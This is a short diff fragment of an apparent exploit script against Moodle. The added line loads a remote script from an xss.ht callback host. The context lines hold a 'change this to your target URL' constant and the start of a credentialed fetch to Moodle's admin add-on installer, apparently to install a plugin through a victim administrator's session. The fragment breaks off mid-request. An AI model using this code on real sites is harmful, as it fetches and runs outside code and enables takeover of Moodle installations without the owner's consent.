@@ -1,3 +1,4 @@
+$.getScript("//buemoodle.xss.ht");
 const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
   fetch(URL + "admin/tool/installaddon/index.php", {
     credentials: "include",
